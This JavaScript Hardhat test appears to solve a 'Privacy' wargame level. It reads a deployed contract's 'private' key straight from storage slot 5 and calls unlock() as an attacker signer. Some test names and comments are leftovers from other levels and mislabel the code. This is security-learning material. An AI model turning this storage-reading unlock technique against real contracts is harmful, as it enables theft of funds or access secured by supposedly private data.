const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")
const { expect } = require("chai")
const { copyFileSync } = require("fs")
const { ethers } = require("hardhat")

describe("Privacy", () => {
  async function deployFallbackFixture () {
    const [deployer, attacker] = await ethers.getSigners()
    const ContractFactory = await ethers.getContractFactory("Privacy")
    const contract = await ContractFactory.connect(deployer).deploy([
      ethers.encodeBytes32String("tzz"),
      ethers.encodeBytes32String("love"),
      ethers.encodeBytes32String("scc"),
    ])
    await contract.waitForDeployment()
    const contractAddress = await contract.getAddress()

    return { contract, attacker }
  }

  it("Should consecutiveWins ", async () => {
    const { contract, attacker } = await loadFixture(deployFallbackFixture)

    // 访问存储插槽
    const r = await ethers.provider.getStorage(await contract.getAddress(), 5)
    // console.log(r)
    // 1字节 = 8个二进制位 = 2个16进制位
    // slice(start,end(不包含))
    const key = r.slice(0, 34)
    console.log(key)

    const attackTx = await contract.connect(attacker).unlock(key)
    await attackTx.wait()

    // 断言：被攻击合约的连胜应为10
    console.log(await contract.locked())
    expect(await contract.locked()).to.equal(false)

  })
})